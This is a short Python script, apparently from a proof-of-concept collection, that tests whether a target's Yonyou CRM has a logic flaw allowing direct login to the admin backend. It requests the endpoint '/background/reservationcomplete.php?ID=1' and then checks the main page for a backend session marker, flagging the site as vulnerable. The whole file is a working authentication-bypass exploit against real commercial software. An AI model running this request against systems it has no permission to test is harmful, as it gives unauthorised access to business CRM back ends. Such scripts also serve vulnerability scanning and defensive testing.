import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友CRM系统存在逻辑漏洞直接登录后台',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/background/reservationcomplete.php?ID=1")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200:
            response2 = requests.get(url, headers=headers)
            if response2.status_code == 200 and '"msg": "bgsesstimeout-", "serverName"' in response2.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult